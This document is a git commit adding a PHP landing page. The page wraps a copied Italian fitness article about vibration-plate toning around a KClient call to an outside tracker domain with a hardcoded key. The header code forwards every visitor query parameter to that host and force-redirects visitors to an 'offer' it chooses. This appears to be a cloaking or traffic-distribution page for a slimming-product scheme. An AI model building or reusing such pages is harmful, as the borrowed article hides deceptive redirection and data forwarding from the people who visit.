f096a0a5765957fb69f2a05d1e93333873c12232
Timolaus <68034698+Timolaus@users.noreply.github.com>
2020-07-09 01:12:39 +0300

    *
    *

---
+++ index.php
@@ -0,0 +1,126 @@
+<?php
+// Query params are:  
+
+require_once dirname(__FILE__) . '/kclient.php';
+$client = new KClient('https://idealslim-italiaufficiale.site/api.php?', 'DBDsDYtTsNfMtZpF');
+$client->sendAllParams();       // to send all params from page query
+$client->forceRedirectOffer();       // redirect to offer if an offer is chosen
+// $client->param('sub_id_5', '123'); // you can send any params
+// $client->keyword('PASTE_KEYWORD');  // send custom keyword
+// $client->currentPageAsReferrer(); // to send current page URL as click referrer
+// $client->debug();              // to enable debug mode and show the errors
+// $client->execute();             // request to api, show the output and continue
+$client->executeAndBreak();     // to stop page execution if there is redirect or some output
+?>
+
+<!DOCTYPE html>
+
+<html lang="it">
+<head>
+    
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+
+	
+	
+	<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
+	<meta content="width=device-width, initial-scale=1" name="viewport">
+	<title>FULL TONE SU PEDANA VIBRANT</title>
+	
+	
+
+	
+	
+	
+	        <link media="all" href="css/index.css" type="text/css" rel="stylesheet">
+    
+
+</head>
+<body>
+
+<!DOCTYPE html>
+<html>
+<head>
+	<title>be1.ru</title>
+</head>
+<body>
+<h1>FULL TONE SU PEDANA VIBRANT</h1>
+
+<h2>TONICIT&Agrave; MUSCOLARE</h2>
+
+<p dir="ltr">Per tono muscolare si intende una situazione condizionale nella quale la muscolatura viene a trovarsi in seguito all&#39;allenamento motorio.</p>
+
+<p dir="ltr">&Egrave; per&ograve; doveroso sottolineare che in molti professionisti non riconoscono l&#39;associazione tra il sostantivo &quot;tono&quot; e il concetto sopra menzionato &ndash; peraltro abbastanza generico; al contrario, la reale definizione di tono &egrave; prettamente di natura fisiologica e riguarda l&#39;equilibrio neuro-muscolare di base. Un muscolo tonico &egrave; tale in quanto riceve continuamente dei deboli impulsi basali che lo fanno rimanere leggermente contratto; tale caratteristica non &egrave; modificabile con l&#39;allenamento e soprattutto non pu&ograve; venire meno, o il risultato sarebbe un disturbo anche di grave entit&agrave;.</p>
+
+<p dir="ltr">Diverso &egrave; se parlassimo di trofismo, ovvero dello stato trofico del muscolo &ndash; al quale si associa anche la capacit&agrave; di contrazione o espressione di forza. La compattezza del tessuto contrattile riguarda poi anche molti altri fattori; ad esempio, un muscolo &quot;esaurito&quot; e in preda a i DOMS ha una consistenza &quot;pi&ugrave; morbida&quot;, cos&igrave; come pu&ograve; avvenire in seguito ad uno stimolo insulinico molto intenso e prolungato &ndash; questa condizione &egrave; sperimentata soprattutto da alcuni culturisti, ma al momento non se ne conoscono i meccanismi precisi. Altre cause &quot;straordinariamente diffuse&quot; di apparente riduzione della tonicit&agrave;, o meglio della consistenza, sono un tessuto adiposo eccessivo, blanda ritenzione idrica e lieve infiammazione.</p>
+
+<h2>COME ALLENARSI PER LA TONICIT&Agrave;</h2>
+
+<p dir="ltr">Quindi, parlando di trofismo, possiamo concludere che l&#39;allenamento motorio di muscolazione permette un miglioramento di questo parametro estetico.</p>
+
+<p dir="ltr">D&#39;altro canto, l&#39;esaurimento muscolare porta ad un periodico decadimento della capacit&agrave; contrattile, oltre che a una leggera infiammazione locale con blanda e momentanea ritenzione di liquidi. Quindi, l&#39;allenamento per mantenere &quot;costante&quot; la tonicit&agrave; non pu&ograve; essere lo stesso di un bodybuilder; con esso per&ograve;, il protocollo di tonicit&agrave; condivide l&#39;aspetto dietetico, poich&eacute; come abbiamo detto un eccesso adiposo conferisce un aspetto e una consistenza di minor trofismo.</p>
+
+<p dir="ltr">Di seguito proporremo un allenamento diverso dal solito, ovvero svolto su pedana vibrante, utile per il rinforzo muscolare e quindi per il trofismo, ma che permette di mantenere costante la capacit&agrave; contrattile e la compattezza dei muscoli (alias: tonicit&agrave;).</p>
+
+<p><img src="/1.jpg" /></p>
+
+<h2>FULL TONE SU PEDANA VIBRANTE</h2>
+
+<p dir="ltr">La scelta di usare una pedana vibrante, oltre che per variare le solite routine, pu&ograve; essere utile nell&#39;amplificare uno stimolo allenante altrimenti di media entit&agrave;.</p>
+
+<p dir="ltr">Le vibrazioni possono stimolare la risposta naturale del corpo, attivando le contrazioni muscolari tra 25 e 50 volte al secondo. Questo allenamento induce naturalmente il corpo umano a reagire con azioni muscolari involontarie. Il risultato &egrave; un miglioramento della produzione di forza, a parit&agrave; di altri stimoli indotti &ndash; ovvero gli esercizi.</p>
+
+<p dir="ltr">Quella che seguir&agrave; &egrave; l&#39;elaborazione di una serie di esercizi in circuit training specifica per pedana vibrante, dotata di un discreto grado di intensit&agrave;, indirizzato alla tonificazione generale (total body) e soprattutto del core.</p>
+
+<p>Indicazioni generali</p>
+
+<ul>
+	<li dir="ltr">
+	<p dir="ltr">Fase di riscaldamento</p>
+	</li>
+	<li dir="ltr">
+	<p dir="ltr">Middle squat e defaticamento, massaggio di almeno 60&quot;</p>
+	</li>
+	<li dir="ltr">
+	<p dir="ltr">Ripetere il circuito almeno due volte, con l&#39;obbiettivo di arrivare al terzo</p>
+	</li>
+	<li dir="ltr">
+	<p dir="ltr">Nessuna pausa tra gli esercizi, pausa di almeno due minuti alla fine di ogni circuito</p>
+	</li>
+	<li dir="ltr">
+	<p dir="ltr">Evoluzione dinamica direttamente proporzionale all&#39;incremento delle capacit&agrave; organiche.</p>
+	</li>
+</ul>
+
+<p>Esercizio 1: Affondi Esercizio verticale statico</p>
+
+<p dir="ltr">L&#39;arto inferiore sulla macchina &egrave; flesso a 90&deg; con la gamba &quot;ginocchio-caviglia&quot; perfettamente verticale ed il peso &egrave; distribuito su tutto il piede. L&#39;arto inferiore sulla swiss ball &egrave; flesso a 90&deg; con una forte pressione verso il basso, con contrazione volontaria del gluteo. Arti superiori in trazione sui nastri, perfettamente verticali.</p>
+
+<p>ESERCIZIO 2: PETTORALI ESERCIZIO ORIZZONTALE</p>
+
+<p dir="ltr">Piedi in appoggio alla larghezza delle spalle sulla palla in zona discendente. Mani in appoggio sulla macchina in posizione leggermente pi&ugrave; ampia della larghezza delle spalle. Mani intraruotate di 45&deg;. Evoluzione dinamica.</p>
+
+<p>Esercizio 3: Glutei- Addominali Posizione seduta su palla in fase discendente</p>
+
+<p dir="ltr">Piedi in appoggio sulla macchina alla larghezza delle spalle, extraruotati. Segmento articolare perfettamente verticale. Elastico in tensione massima appena sotto l&#39;articolazione del ginocchio. Arti superiori distesi sopra la testa, con palla medicale. Evoluzione dinamica.</p>
+
+<p>Esercizio 4: Tricipiti Posizione orizzontale</p>
+
+<p dir="ltr">Presa solida sulla macchina, flessione a 90&deg; delle braccia, gambe tese, in appoggio sulla palla, alla larghezza delle spalle. Evoluzione dinamica.</p>
+
+<p dir="ltr">Fonte: <a href="https://www.google.com/url?q=https%3A%2F%2Fwww.my-personaltrainer.it%2Fallenamento%2Ffull-tone-pedana-vibrante.html&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNEkzkD5Gi6rVHDyilug1hv1KwqSFA" rel="noopener" target="_blank">https://www.my-personaltrainer.it/allenamento/full-tone-pedana-vibrante.html</a></p>
+
+<p><img src="/2.jpg" /></p>
+
+<p>AUTORE</p>
+
+<p><a href="https://www.google.com/url?q=https%3A%2F%2Fwww.my-personaltrainer.it%2Fautore%2Friccardo-borgacci.html&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNEQ5u2swFeyh8rryTbJLn8IBnkIDw" rel="noopener" target="_blank">Riccardo Borgacci</a></p>
+
+<p dir="ltr">Laureato in Scienze motorie e in Dietistica, esercita in libera professione attivit&agrave; di tipo ambulatoriale come dietista e personal trainer</p>
+</body>
+</html>
+
+
+
+</body>
+</html>
